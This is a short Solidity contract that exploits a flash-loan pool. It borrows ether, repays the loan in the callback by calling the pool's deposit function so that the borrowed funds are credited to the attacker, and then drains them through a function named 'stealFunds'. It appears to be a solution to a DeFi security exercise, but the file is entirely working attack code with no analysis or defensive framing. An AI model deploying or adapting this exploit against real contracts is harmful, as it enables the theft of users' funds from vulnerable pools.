// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface FlashLoan {
    function flashLoan(uint256 borrowAmount) external;
    function deposit() external payable;
    function withdraw() external;
}

contract Borrow {
    receive() external payable {}

    function takeLoan(address flashLoanAddress, uint256 amount) external {
        FlashLoan(flashLoanAddress).flashLoan(amount);
    }

    function stealFunds(address flashLoanAddress) external {
        FlashLoan(flashLoanAddress).withdraw();
    }

    function receiveTokens(uint256 amount) external {
        // return the money to the DeFi contract
        // (bool sent, ) = msg.sender.call{value: amount}("");
        // require(sent, "Failed to send Ether");

        //return Loan by deposit
        FlashLoan(msg.sender).deposit{value: amount}();
    }
}